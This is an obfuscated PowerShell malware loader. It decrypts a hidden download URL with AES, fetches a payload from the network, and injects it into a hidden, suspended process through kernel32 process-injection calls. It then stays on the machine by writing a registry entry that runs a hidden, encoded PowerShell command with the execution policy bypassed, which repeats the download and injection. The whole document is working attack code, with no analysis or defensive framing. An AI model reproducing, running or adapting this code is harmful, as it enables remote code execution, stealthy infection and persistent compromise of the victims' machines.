[System.Threading.Thread]::CurrentThread.CurrentCulture = [System.Globalization.CultureInfo]::InvariantCulture
[System.Threading.Thread]::CurrentThread.CurrentUICulture = [System.Globalization.CultureInfo]::InvariantCulture
$ErrorActionPreference = ("{3}{1}{0}{2}" -f 'lyConti','ilent','nue','S')

function fncA`Lc {
    $seg = 100
    $inc = 4.0 / $seg
    $acc = 0.0
    for ($i = 0; $i -lt $seg; $i++) {
        $x = $i * $inc
        $acc += ($x * $x) * $inc
    }
    $dPart = 12.0
    $sum = $acc + $dPart
    return [math]::Round($sum, 5).ToString().Replace('.', '')
}

$lineA = ("{1}{7}{0}{3}{6}{8}{2}{5}{4}" -f 'za','go','mu','l_','_xof','j','eht_r','d_y','evo_sp')
$lineB = ("{2}{0}{1}"-f'worb_kci','uq_','_n')
$lineC = "eht"
$all = $lineA + $lineB + $lineC

function f`NkEY($calcVal, $ss) {
    $combo = $calcVal + $ss
    if ($combo.Length -lt 16) { $combo += "0" * (16 - $combo.Length) }
    return [Text.Encoding]::UTF8.GetBytes($combo.Substring(0, 16))
}

$z = fnCalc
$k = fnKey $z $all
$v = New-Object ("{1}{0}" -f']','Byte[')(16)

function FNd`EC {
    param(
        [string]$c,
        [byte[]]$kk,
        [byte[]]$iv
    )
    [byte[]]$raw = [Convert]::FromBase64String($c)
    $aes = New-Object ("{8}{7}{6}{1}{2}{10}{0}{3}{5}{11}{4}{9}" -f '.','u','r','Crypt','.A','ograp','em.Sec','yst','S','esManaged','ity','hy')
    $aes.Key = $kk
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $dec = $aes.CreateDecryptor()
    [byte[]]$out = $dec.TransformFinalBlock($raw, 0, $raw.Length)
    $aes.Dispose()
    return [Text.Encoding]::UTF8.GetString($out)
}

$a1 = ("{5}{9}{22}{11}{15}{16}{0}{20}{1}{4}{18}{14}{3}{8}{13}{17}{19}{12}{7}{10}{6}{21}{23}{2}" -f'6hJ4se','pIo','2bk=','h','FY7FfkKMAY','ab','xJTFB','ALw','/oN','S','TS','Ag9vCxjF','1ZKM','gHraeQz8R+olyl/Pj','Ap','w9mYKX','vGM','6fr','tjVK','9t4lbg','EOUOuz','O8','53Uum','nz')
$a2 = ("{8}{13}{10}{7}{5}{11}{2}{3}{12}{9}{1}{6}{4}{0}"-f'w/Mw==','l21hSqjMx6','HPw2D','bXwiJrO9jk','KqpJdFHR4L','xHFEE','l','J','/l2lk3lqm','XgT','BfXcBCcw7LNVk6E5','ZJF','JKlNOgu','2h')
$a3 = ("{12}{6}{3}{7}{1}{2}{10}{9}{4}{0}{11}{5}{8}" -f 'CR','u','OqDS','0k','+TfUWo','5','8ugf2V','Pj','UStx7U=','ScI','Hhx','fn8','bzuv')
$a4 = ("{3}{6}{4}{7}{0}{10}{2}{1}{9}{8}{5}" -f 'uRgqd','bC','PAV','IdXvhxgC','9','k3ohxizo=','U','z9pi','9jhg7','A','L7rs2')

try {
    $u  = fnDec -c $a1 -kk $k -iv $v  
    $rp = fnDec -c $a2 -kk $k -iv $v 
    $px = fnDec -c $a3 -kk $k -iv $v  
    $rv = fnDec -c $a4 -kk $k -iv $v  
} catch {
    return
}

# --- Conditional load for the xR C# type ---
if (-not ("xR" -as [Type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class xR {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(
        string lpApplicationName, 
        string lpCommandLine,
        IntPtr lpProcessAttributes, 
        IntPtr lpThreadAttributes, 
        bool bInheritHandles,
        uint dwCreationFlags, 
        IntPtr lpEnvironment, 
        string lpCurrentDirectory,
        ref SI lpStartupInfo, 
        out PI lpProcessInformation
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, 
        IntPtr lpAddress,
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, 
        IntPtr lpBaseAddress, 
        byte[] lpBuffer, 
        int nSize, 
        out IntPtr lpNumberOfBytesWritten
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, 
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        out IntPtr lpThreadId
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    public struct SI {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    public static bool zQ(byte[] pl, string tx) {
        // If token parsing issues occur, try using an inline comment in the type cast:
        // For example: [Type]( /*fix*/ 'xR')
        SI si = new SI();
        si.cb = (uint)Marshal.SizeOf(si);
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;
        PI pi = new PI();
        uint cf = 0x08000000 | 0x4; 
        bool ok = CreateProcess(tx, null, IntPtr.Zero, IntPtr.Zero, false, cf, IntPtr.Zero, null, ref si, out pi);
        if(!ok) return false;
        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
        if(addr == IntPtr.Zero) return false;
        IntPtr tmp;
        bool wr = WriteProcessMemory(pi.hProcess, addr, pl, pl.Length, out tmp);
        if(!wr || (int)tmp != pl.Length) return false;
        IntPtr thrId;
        IntPtr thr = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out thrId);
        if(thr == IntPtr.Zero) return false;
        ResumeThread(pi.hThread);
        return true;
    }
}
"@
}

try {
    $wc = New-Object ("{0}{2}{5}{6}{3}{1}{4}"-f'Syst','lien','em.N','C','t','et','.Web')
    [byte[]]$payload = $wc.DownloadData($u)
    if ($payload -and $payload.Length -gt 0) {
        [xR]::zQ($payload, $px) | Out-Null
    }
} catch {
    return
}

$st = @'
param([string]$u, [string]$p)
try {
  $wc = New-Object System.Net.WebClient
  [byte[]]$b = $wc.DownloadData($u)
  # Conditional load for xR in this new session
  if (-not ("xR" -as [Type])) {
      Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class xR {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(string a, string c, IntPtr pa, IntPtr ta, bool i, uint f, IntPtr e, string d, ref SI si, out PI pi);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hp, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hp, IntPtr ba, byte[] buf, int n, out IntPtr wr);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hp, IntPtr attr, uint st, IntPtr sa, IntPtr pr, uint fl, out IntPtr t2);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hT);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    public struct SI {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    public static bool zQ(byte[] pl, string tx) {
        SI si = new SI();
        si.cb = (uint)System.Runtime.InteropServices.Marshal.SizeOf(si);
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;
        PI pi = new PI();
        uint cf = 0x08000000 | 0x4;
        bool ok = CreateProcess(tx, null, IntPtr.Zero, IntPtr.Zero, false, cf, IntPtr.Zero, null, ref si, out pi);
        if(!ok) return false;
        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
        if(addr == IntPtr.Zero) return false;
        IntPtr wr;
        bool w2 = WriteProcessMemory(pi.hProcess, addr, pl, pl.Length, out wr);
        if(!w2 || (int)wr != pl.Length) return false;
        IntPtr tid;
        IntPtr thr = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);
        if(thr == IntPtr.Zero) return false;
        ResumeThread(pi.hThread);
        return true;
    }
}
"@
  }
  [xR]::zQ($b, $p) | Out-Null
} catch {}
'@

$stB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($st))
$rcmd = ('powersh'+'ell'+'.e'+'xe '+'-No'+'P'+'rofile '+'-Wind'+'o'+'wSty'+'le '+'Hid'+'d'+'en '+'-'+'Ex'+'ec'+'ut'+'ionPo'+'licy '+'Bypas'+'s '+'-'+'Encod'+'e'+'dCommand'+' '+"$stB64 "+'-u'+' '+"`"$u`" "+'-p'+' '+"`"$px`"")

try {
    New-ItemProperty -Path $rp -Name $rv -Value $rcmd -PropertyType ("{1}{0}" -f'g','Strin') -Force | Out-Null
} catch {}
